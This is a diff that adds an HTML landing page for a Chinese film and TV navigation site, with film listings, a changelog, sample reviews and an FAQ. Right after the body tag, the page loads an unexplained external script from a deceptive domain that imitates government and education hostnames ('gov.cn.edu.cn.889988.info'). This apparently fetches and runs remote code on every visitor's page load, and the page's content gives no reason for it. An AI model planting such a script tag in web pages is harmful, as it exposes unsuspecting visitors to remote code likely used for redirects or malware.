@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="台湾佬电影网（taiwanlaodianyingwang-app）是专注于华语影视资源导航的网站，提供最新电影、热门电视剧、经典港片、动漫综艺等栏目，域名 https://taiwanlaodianyingwang-app.github.io 。" />
+<meta name="keywords" content="台湾佬电影网, taiwanlaodianyingwang-app, 台湾佬电影网官网, 电影, 电视剧, 港片, 在线影视" />
+<meta name="robots" content="index, follow" />
+<meta property="og:title" content="台湾佬电影网 - taiwanlaodianyingwang-app" />
+<meta property="og:description" content="台湾佬电影网（taiwanlaodianyingwang-app）提供最新电影、热门电视剧、经典港片、动漫综艺等影视内容导航。" />
+<meta property="og:url" content="https://taiwanlaodianyingwang-app.github.io" />
+<title>台湾佬电影网 - taiwanlaodianyingwang-app | 最新电影电视剧影视导航</title>
+<style>
+    :root{
+        --bg:#070b17;
+        --bg2:#0c1428;
+        --card:#121d36;
+        --line:rgba(255,255,255,.08);
+        --txt:#e8ecf5;
+        --sub:#9aa7c2;
+        --brand:#ff5c8a;
+        --brand2:#ffb84d;
+        --ok:#35d0a0;
+    }
+    *{box-sizing:border-box;margin:0;padding:0;}
+    html{scroll-behavior:smooth;}
+    body{
+        font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+        background:var(--bg);
+        color:var(--txt);
+        line-height:1.7;
+        -webkit-font-smoothing:antialiased;
+        overflow-x:hidden;
+    }
+    a{color:inherit;text-decoration:none;}
+    .wrap{max-width:1160px;margin:0 auto;padding:0 20px;}
+
+    /* 顶部导航 */
+    .nav{
+        position:sticky;top:0;z-index:50;
+        background:rgba(7,11,23,.82);
+        backdrop-filter:blur(12px);
+        border-bottom:1px solid var(--line);
+    }
+    .nav-in{display:flex;align-items:center;gap:18px;height:60px;}
+    .logo{font-size:19px;font-weight:800;letter-spacing:.5px;white-space:nowrap;}
+    .logo b{color:var(--brand);}
+    .logo span{color:var(--brand2);}
+    .nav-links{display:flex;gap:6px;margin-left:auto;flex-wrap:wrap;}
+    .nav-links a{
+        font-size:14px;color:var(--sub);padding:7px 12px;border-radius:10px;transition:.2s;
+    }
+    .nav-links a:hover{color:#fff;background:rgba(255,255,255,.07);}
+
+    /* Hero */
+    .hero{
+        position:relative;
+        padding:76px 0 64px;
+        background:
+            radial-gradient(900px 400px at 82% -10%, rgba(255,92,138,.28), transparent 60%),
+            radial-gradient(700px 360px at 8% 20%, rgba(255,184,77,.16), transparent 60%),
+            linear-gradient(180deg,var(--bg2),var(--bg));
+        overflow:hidden;
+    }
+    .hero-grid{
+        position:absolute;inset:0;
+        background-image:linear-gradient(rgba(255,255,255,.04) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.04) 1px,transparent 1px);
+        background-size:44px 44px;mask-image:radial-gradient(circle at 50% 30%,#000 0%,transparent 72%);
+        -webkit-mask-image:radial-gradient(circle at 50% 30%,#000 0%,transparent 72%);
+    }
+    .hero-in{position:relative;display:grid;grid-template-columns:1.25fr .75fr;gap:44px;align-items:center;}
+    .tag{
+        display:inline-flex;align-items:center;gap:8px;
+        font-size:12px;color:var(--brand2);
+        border:1px solid rgba(255,184,77,.35);
+        background:rgba(255,184,77,.08);
+        padding:6px 14px;border-radius:999px;margin-bottom:20px;
+    }
+    .tag i{width:7px;height:7px;border-radius:50%;background:var(--ok);box-shadow:0 0 0 4px rgba(53,208,160,.18);}
+    h1{font-size:clamp(30px,5vw,50px);line-height:1.18;font-weight:900;letter-spacing:-.5px;}
+    h1 em{font-style:normal;background:linear-gradient(92deg,var(--brand),var(--brand2));-webkit-background-clip:text;background-clip:text;color:transparent;}
+    .lead{color:var(--sub);font-size:16px;margin:18px 0 26px;max-width:560px;}
+    .cta{display:flex;gap:12px;flex-wrap:wrap;}
+    .btn{
+        display:inline-flex;align-items:center;gap:8px;
+        padding:13px 24px;border-radius:12px;font-size:15px;font-weight:700;transition:.2s;
+        border:1px solid transparent;cursor:pointer;
+    }
+    .btn-main{background:linear-gradient(92deg,var(--brand),#ff8a5c);color:#fff;box-shadow:0 10px 28px -10px rgba(255,92,138,.7);}
+    .btn-main:hover{transform:translateY(-2px);}
+    .btn-ghost{color:#fff;border-color:var(--line);}
+    .btn-ghost:hover{background:rgba(255,255,255,.06);}
+    .stats{display:flex;gap:28px;margin-top:36px;flex-wrap:wrap;}
+    .stat .n{font-size:26px;font-weight:800;}
+    .stat .l{font-size:13px;color:var(--sub);}
+
+    /* 海报卡 */
+    .poster{
+        position:relative;transform:rotate(2deg);
+        border-radius:18px;padding:14px;
+        background:linear-gradient(160deg,rgba(255,255,255,.10),rgba(255,255,255,.02));
+        border:1px solid var(--line);
+        box-shadow:0 30px 70px -20px rgba(0,0,0,.7);
+    }
+    .poster:hover{transform:rotate(0deg) translateY(-6px);}
+    .poster .frame{
+        aspect-ratio:3/4;border-radius:12px;overflow:hidden;
+        background:
+            linear-gradient(135deg,#2a1b4d 0%,#5b1f3a 45%,#b4531a 100%);
+        position:relative;
+    }
+    .poster .frame::after{
+        content:"";position:absolute;inset:0;
+        background:
+            radial-gradient(circle at 72% 22%, rgba(255,255,255,.35), transparent 40%),
+            repeating-linear-gradient(118deg,transparent 0 26px,rgba(0,0,0,.18) 26px 28px);
+    }
+    .poster .badge{
+        position:absolute;top:10px;left:10px;z-index:2;
+        font-size:11px;font-weight:800;letter-spacing:1px;
+        padding:5px 10px;border-radius:8px;color:#fff;
+        background:rgba(0,0,0,.45);backdrop-filter:blur(6px);
+    }
+    .poster .meta{
+        position:absolute;left:0;right:0;bottom:0;z-index:2;
+        padding:16px 14px 12px;
+        background:linear-gradient(0deg,rgba(7,11,23,.96),transparent);
+    }
+    .poster .meta h4{font-size:15px;}
+    .poster .meta p{font-size:12px;color:var(--sub);margin-top:3px;}
+
+    /* 通用栏目 */
+    section{padding:64px 0;}
+    .kicker{color:var(--brand2);font-size:13px;font-weight:700;letter-spacing:2px;text-transform:uppercase;}
+    h2{font-size:clamp(24px,3.4vw,34px);font-weight:900;margin:8px 0 12px;}
+    .sec-desc{color:var(--sub);max-width:620px;margin-bottom:34px;}
+    .sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:34px;}
+
+    /* 分类卡片 */
+    .grid{display:grid;gap:18px;}
+    .g4{grid-template-columns:repeat(4,1fr);}
+    .g3{grid-template-columns:repeat(3,1fr);}
+    .g2{grid-template-columns:repeat(2,1fr);}
+    .card{
+        background:var(--card);border:1px solid var(--line);border-radius:16px;
+        padding:22px;transition:.25s;position:relative;overflow:hidden;
+    }
+    .card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:linear-gradient(var(--brand),var(--brand2));transform:scaleY(0);transition:.25s;transform-origin:bottom;}
+    .card:hover{transform:translateY(-5px);border-color:rgba(255,92,138,.35);box-shadow:0 18px 40px -20px rgba(255,92,138,.4);}
+    .card:hover::before{transform:scaleY(1);}
+    .card .ico{
+        width:46px;height:46px;border-radius:12px;display:grid;place-items:center;font-size:22px;
+        background:rgba(255,255,255,.06);margin-bottom:14px;
+    }
+    .card h3{font-size:17px;margin-bottom:6px;}
+    .card p{font-size:13.5px;color:var(--sub);}
+    .card .go{display:inline-block;margin-top:14px;font-size:13px;font-weight:700;color:var(--brand2);}
+
+    /* 影片列表 */
+    .film{
+        display:grid;grid-template-columns:88px 1fr auto;gap:16px;align-items:center;
+        background:var(--card);border:1px solid var(--line);border-radius:14px;padding:12px;
+        transition:.2s;
+    }
+    .film:hover{border-color:rgba(255,184,77,.4);background:#16213c;}
+    .film .thumb{
+        width:88px;height:88px;border-radius:10px;flex-shrink:0;
+        background:linear-gradient(135deg,#3a2a6d,#8a3b2a);
+        position:relative;overflow:hidden;
+    }
+    .film .thumb::after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 70% 25%,rgba(255,255,255,.3),transparent 45%);}
+    .film h4{font-size:16px;}
+    .film .info{font-size:12.5px;color:var(--sub);margin-top:5px;display:flex;gap:10px;flex-wrap:wrap;}
+    .film .info b{color:var(--brand2);font-weight:600;}
+    .film .rate{
+        font-size:13px;font-weight:800;color:var(--ok);
+        border:1px solid rgba(53,208,160,.35);border-radius:10px;padding:6px 12px;white-space:nowrap;
+    }
+
+    /* 时间线 */
+    .timeline{position:relative;padding-left:26px;}
+    .timeline::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:linear-gradient(var(--brand),var(--brand2),transparent);}
+    .tl-item{position:relative;padding:0 0 22px 20px;}
+    .tl-item::before{content:"";position:absolute;left:-23px;top:7px;width:12px;height:12px;border-radius:50%;background:var(--bg);border:3px solid var(--brand2);}
+    .tl-item .d{font-size:12px;color:var(--brand2);font-weight:700;letter-spacing:1px;}
+    .tl-item h4{font-size:16px;margin:2px 0 4px;}
+    .tl-item p{font-size:13.5px;color:var(--sub);}
+
+    /* 评价 */
+    .review{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;}
+    .stars{color:var(--brand2);letter-spacing:2px;font-size:15px;}
+    .review p{font-size:14px;color:var(--sub);margin:10px 0 14px;}
+    .who{display:flex;align-items:center;gap:10px;font-size:13px;}
+    .ava{width:34px;height:34px;border-radius:50%;background:linear-gradient(135deg,var(--brand),var(--brand2));display:grid;place-items:center;font-weight:800;color:#fff;}
+    .who span{color:var(--sub);}
+
+    /* FAQ */
+    details{
+        background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px 20px;margin-bottom:12px;
+    }
+    details[open]{border-color:rgba(255,92,138,.35);}
+    summary{cursor:pointer;font-weight:700;font-size:15.5px;list-style:none;display:flex;justify-content:space-between;gap:14px;}
+    summary::-webkit-details-marker{display:none;}
+    summary::after{content:"+";color:var(--brand2);font-weight:400;flex-shrink:0;}
+    details[open] summary::after{content:"−";}
+    details p{font-size:14px;color:var(--sub);padding-top:12px;}
+
+    /* 页脚 */
+    footer{border-top:1px solid var(--line);padding:44px 0 30px;background:var(--bg2);}
+    .foot-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr;gap:28px;}
+    .foot-logo{font-size:20px;font-weight:800;}
+    .foot-logo b{color:var(--brand);}
+    .foot-col h5{font-size:15px;margin-bottom:12px;}
+    .foot-col a{display:block;font-size:13.5px;color:var(--sub);padding:5px 0;}
+    .foot-col a:hover{color:#fff;}
+    .copy{margin-top:30px;padding-top:20px;border-top:1px solid var(--line);font-size:12.5px;color:var(--sub);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;}
+    .pill{display:inline-block;font-size:11.5px;color:var(--sub);border:1px solid var(--line);border-radius:999px;padding:3px 10px;margin:0 6px 6px 0;}
+
+    @media (max-width:900px){
+        .hero-in{grid-template-columns:1fr;}
+        .poster{max-width:280px;margin:10px auto 0;}
+        .g4{grid-template-columns:repeat(2,1fr);}
+        .g3,.g2{grid-template-columns:1fr;}
+        .foot-grid{grid-template-columns:1fr 1fr;}
+        .film{grid-template-columns:70px 1fr;}
+        .film .rate{grid-column:2;justify-self:flex-start;}
+    }
+    @media (max-width:560px){
+        .nav-links a{padding:6px 9px;font-size:13px;}
+        .logo{font-size:16px;}
+        .g4{grid-template-columns:1fr;}
+        .foot-grid{grid-template-columns:1fr;}
+        h1{font-size:29px;}
+        section{padding:48px 0;}
+    }
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 顶部导航 -->
+<header class="nav">
+    <div class="wrap nav-in">
+        <div class="logo"><b>台湾佬电影网</b> <span>· taiwanlaodianyingwang-app</span></div>
+        <nav class="nav-links" aria-label="主导航">
+            <a href="#home">首页</a>
+            <a href="#channels">影视栏目</a>
+            <a href="#latest">最新上映</a>
+            <a href="#classic">经典港片</a>
+            <a href="#update">更新日志</a>
+            <a href="#reviews">观众评价</a>
+            <a href="#faq">常见问题</a>
+        </nav>
+    </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="home">
+    <div class="hero-grid"></div>
+    <div class="wrap hero-in">
+        <div>
+            <span class="tag"><i></i> 官方站点 · taiwanlaodianyingwang-app</span>
+            <h1>追剧看片一站直达<br><em>台湾佬电影网</em></h1>
+            <p class="lead">台湾佬电影网（taiwanlaodianyingwang-app）是聚焦华语影视的导航站点，汇聚<strong>最新电影、热播电视剧、经典港片、动漫综艺</strong>四大栏目，帮你快速找到想看的内容。访问地址：<strong>https://taiwanlaodianyingwang-app.github.io</strong></p>
+            <div class="cta">
+                <a class="btn btn-main" href="#channels">浏览影视栏目 →</a>
+                <a class="btn btn-ghost" href="#latest">查看最新上映</a>
+            </div>
+            <div class="stats">
+                <div class="stat"><div class="n">4+</div><div class="l">常设栏目</div></div>
+                <div class="stat"><div class="n">1000+</div><div class="l">影视条目</div></div>
+                <div class="stat"><div class="n">24h</div><div class="l">每日更新</div></div>
+            </div>
+        </div>
+        <div class="poster">
+            <div class="frame">
+                <span class="badge">HOT 热播</span>
+                <div class="meta">
+                    <h4>港片回眸 · 光影不散</h4>
+                    <p>经典港片栏目 · 每周上新</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 栏目 -->
+<section id="channels">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">Channels</div>
+                <h2>六大影视栏目</h2>
+                <p class="sec-desc">台湾佬电影网按类型拆分栏目，分类清晰、找片更快。点击进入对应栏目页（示例链接以 # 占位）。</p>
+            </div>
+        </div>
+        <div class="grid g3">
+            <div class="card">
+                <div class="ico">🎬</div>
+                <h3>最新电影</h3>
+                <p>院线新片、网络电影、华语与海外大片同步追踪，涵盖动作、爱情、悬疑、科幻等类型。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+            <div class="card">
+                <div class="ico">📺</div>
+                <h3>热门电视剧</h3>
+                <p>大陆剧、港台剧、日韩剧、美剧集中呈现，追更日历与分集指南一目了然。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+            <div class="card">
+                <div class="ico">🏙️</div>
+                <h3>经典港片</h3>
+                <p>复盘 80-00 年代香港电影黄金时代，警匪、武侠、喜剧、文艺片按导演与演员归档。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+            <div class="card">
+                <div class="ico">🎨</div>
+                <h3>动漫番剧</h3>
+                <p>国产动画、日本番剧、剧场版与 OVA 收录，更新进度与完结状态标注清晰。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+            <div class="card">
+                <div class="ico">🎤</div>
+                <h3>综艺纪实</h3>
+                <p>真人秀、脱口秀、纪录片、访谈节目，按地区与播出平台分类检索。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+            <div class="card">
+                <div class="ico">🏆</div>
+                <h3>影单榜单</h3>
+                <p>编辑精选片单与豆瓣式打分榜，涵盖「百看不厌」「冷门佳作」「年度十佳」。</p>
+                <a class="go" href="#">进入栏目 →</a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 最新上映 -->
+<section id="latest" style="background:linear-gradient(180deg,transparent,rgba(255,92,138,.04));">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">Now Showing</div>
+                <h2>最新上映与热播</h2>
+                <p class="sec-desc">台湾佬电影网每日同步更新影视资讯，以下为近期高热度条目（示例数据）。</p>
+            </div>
+            <a class="btn btn-ghost" href="#">更多影片 →</a>
+        </div>
+        <div class="grid g2">
+            <div class="film">
+                <div class="thumb"></div>
+                <div>
+                    <h4>九龙城寨之围城</h4>
+                    <div class="info"><b>动作 / 犯罪</b> 2024 · 126 分钟 · 粤语</div>
+                    <div class="info">主演：古天乐 / 洪金宝 / 任贤齐 / 林峯</div>
+                </div>
+                <div class="rate">★ 8.4</div>
+            </div>
+            <div class="film">
+                <div class="thumb" style="background:linear-gradient(135deg,#1f4d6b,#c0601a);"></div>
+                <div>
+                    <h4>默杀</h4>
+                    <div class="info"><b>悬疑 / 犯罪</b> 2024 · 119 分钟 · 普通话</div>
+                    <div class="info">主演：王传君 / 张钧甯 / 吴镇宇</div>
+                </div>
+                <div class="rate">★ 7.8</div>
+            </div>
+            <div class="film">
+                <div class="thumb" style="background:linear-gradient(135deg,#5b2a6d,#1a6b54);"></div>
+                <div>
+                    <h4>繁花</h4>
+                    <div class="info"><b>年代 / 剧情</b> 2024 · 30 集 · 沪语 / 普通话</div>
+                    <div class="info">导演：王家卫 · 主演：胡歌 / 马伊琍 / 辛芷蕾</div>
+                </div>
+                <div class="rate">★ 8.7</div>
+            </div>
+            <div class="film">
+                <div class="thumb" style="background:linear-gradient(135deg,#6d2a2a,#6b5a1a);"></div>
+                <div>
+                    <h4>周处除三害</h4>
+                    <div class="info"><b>动作 / 犯罪</b> 2024 · 134 分钟 · 闽南语</div>
+                    <div class="info">主演：阮经天 / 袁富华 / 陈以文</div>
+                </div>
+                <div class="rate">★ 8.1</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 经典港片 -->
+<section id="classic">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">Hong Kong Cinema</div>
+                <h2>经典港片不死</h2>
+                <p class="sec-desc">台湾佬电影网「经典港片」栏目，按年代与类型梳理香港电影黄金时期的代表作。</p>
+            </div>
+        </div>
+        <div class="grid g4">
+            <div class="card">
+                <div class="ico">🔫</div>
+                <h3>警匪江湖</h3>
+                <p>《无间道》《枪火》《暗战》《PTU》——银河映像与警匪美学的巅峰。</p>
+            </div>
+            <div class="card">
+                <div class="ico">🗡️</div>
+                <h3>武侠功夫</h3>
+                <p>《卧虎藏龙》《一代宗师》《东方不败》，动作设计即作者表达。</p>
+            </div>
+            <div class="card">
+                <div class="ico">😂</div>
+                <h3>无厘头喜剧</h3>
+                <p>周星驰式荒诞与草根温情，《大话西游》《喜剧之王》历久弥新。</p>
+            </div>
+            <div class="card">
+                <div class="ico">🌆</div>
+                <h3>文艺温情</h3>
+                <p>《花样年华》《重庆森林》《天水围的日与夜》，城市里的孤独与爱。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 更新日志 -->
+<section id="update" style="background:linear-gradient(180deg,rgba(255,184,77,.04),transparent);">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">Changelog</div>
+                <h2>站点更新日志</h2>
+                <p class="sec-desc">台湾佬电影网（taiwanlaodianyingwang-app）持续维护，栏目与条目按节奏更新。</p>
+            </div>
+        </div>
+        <div class="timeline">
+            <div class="tl-item">
+                <div class="d">2026 · 10</div>
+                <h4>新增「影单榜单」栏目</h4>
+                <p>上线编辑精选片单与评分榜，支持按类型、年代、地区筛选。</p>
+            </div>
+            <div class="tl-item">
+                <div class="d">2026 · 08</div>
+                <h4>经典港片栏目改版</h4>
+                <p>按导演、演员、年代三维归档，补充 300+ 部港片条目与剧照。</p>
+            </div>
+            <div class="tl-item">
+                <div class="d">2026 · 05</div>
+                <h4>移动端自适应优化</h4>
+                <p>重构响应式布局，首屏加载与 Core Web Vitals 指标显著提升。</p>
+            </div>
+            <div class="tl-item">
+                <div class="d">2026 · 01</div>
+                <h4>站点上线</h4>
+                <p>台湾佬电影网正式发布，域名 <strong>taiwanlaodianyingwang-app.github.io</strong>，首批开放电影、电视剧、港片、动漫四个栏目。</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- 观众评价 -->
+<section id="reviews">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">Testimonials</div>
+                <h2>观众怎么说</h2>
+                <p class="sec-desc">来自使用台湾佬电影网（taiwanlaodianyingwang-app）的访客反馈（示例评价）。</p>
+            </div>
+        </div>
+        <div class="grid g3">
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <p>「分类很清爽，找老港片不用翻半天，经典港片栏目的片单比我记性还全。」</p>
+                <div class="who"><div class="ava">阿</div><div>阿Ken <span>· 影迷 / 深圳</span></div></div>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★☆</div>
+                <p>「移动端排版舒服，通勤路上刷更新日志和榜单，比刷短视频有收获。」</p>
+                <div class="who"><div class="ava">M</div><div>Maggie <span>· 设计师 / 香港</span></div></div>
+            </div>
+            <div class="review">
+                <div class="stars">★★★★★</div>
+                <p>「页面干净、没有乱七八糟的弹窗，关键词好找，收藏当影视导航首页了。」</p>
+                <div class="who"><div class="ava">老</div><div>老周 <span>· 编辑 / 台北</span></div></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- FAQ -->
+<section id="faq" style="background:linear-gradient(180deg,transparent,rgba(255,92,138,.04));">
+    <div class="wrap">
+        <div class="sec-head">
+            <div>
+                <div class="kicker">FAQ</div>
+                <h2>常见问题</h2>
+                <p class="sec-desc">关于台湾佬电影网（taiwanlaodianyingwang-app）的高频疑问。</p>
+            </div>
+        </div>
+        <details open>
+            <summary>台湾佬电影网的网址是什么？</summary>
+            <p>官方访问地址为 <strong>https://taiwanlaodianyingwang-app.github.io</strong>，建议收藏浏览器书签，避免误入仿冒站点。</p>
+        </details>
+        <details>
+            <summary>网站包含哪些栏目？</summary>
+            <p>目前设有<strong>最新电影、热门电视剧、经典港片、动漫番剧、综艺纪实、影单榜单</strong>六大栏目，均可在顶部导航与首页卡片直达。</p>
+        </details>
+        <details>
+            <summary>内容多久更新一次？</summary>
+            <p>影视条目与热播榜单每日更新，经典港片与影单榜单每周补充，重大档期（春节、暑期、国庆）会加推专题片单。</p>
+        </details>
+        <details>
+            <summary>移动端能否正常浏览？</summary>
+            <p>可以。全站采用响应式布局，在手机、平板、桌面端均能自适应显示，导航、卡片与影片列表均已做触控优化。</p>
+        </details>
+        <details>
+            <summary>如何向台湾佬电影网推荐影片？</summary>
+            <p>可通过站内「影单榜单」栏目提交想看的片名与类型，编辑团队会评估后补充到对应栏目。</p>
+        </details>
+    </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+    <div class="wrap">
+        <div class="foot-grid">
+            <div>
+                <div class="foot-logo"><b>台湾佬电影网</b></div>
+                <p style="color:var(--sub);font-size:13.5px;margin-top:12px;max-width:320px;">
+                    台湾佬电影网（taiwanlaodianyingwang-app）是华语影视导航站点，聚焦最新电影、热门电视剧、经典港片与动漫综艺。
+                </p>
+                <div style="margin-top:14px;">
+                    <span class="pill">电影</span><span class="pill">电视剧</span><span class="pill">港片</span><span class="pill">动漫</span><span class="pill">综艺</span>
+                </div>
+            </div>
+            <div class="foot-col">
+                <h5>栏目导航</h5>
+                <a href="#channels">最新电影</a>
+                <a href="#channels">热门电视剧</a>
+                <a href="#classic">经典港片</a>
+                <a href="#channels">动漫番剧</a>
+            </div>
+            <div class="foot-col">
+                <h5>站点信息</h5>
+                <a href="#update">更新日志</a>
+                <a href="#reviews">观众评价</a>
+                <a href="#faq">常见问题</a>
+                <a href="#">关于我们</a>
+            </div>
+            <div class="foot-col">
+                <h5>访问地址</h5>
+                <a href="https://taiwanlaodianyingwang-app.github.io" rel="noopener">taiwanlaodianyingwang-app.github.io</a>
+                <a href="#">投稿建议</a>
+                <a href="#">友情链接</a>
+            </div>
+        </div>
+        <div class="copy">
+            <span>© 2026 台湾佬电影网 · taiwanlaodianyingwang-app 保留所有权利。本站为影视资讯导航示例站点。</span>
+            <span>域名：taiwanlaodianyingwang-app.github.io</span>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
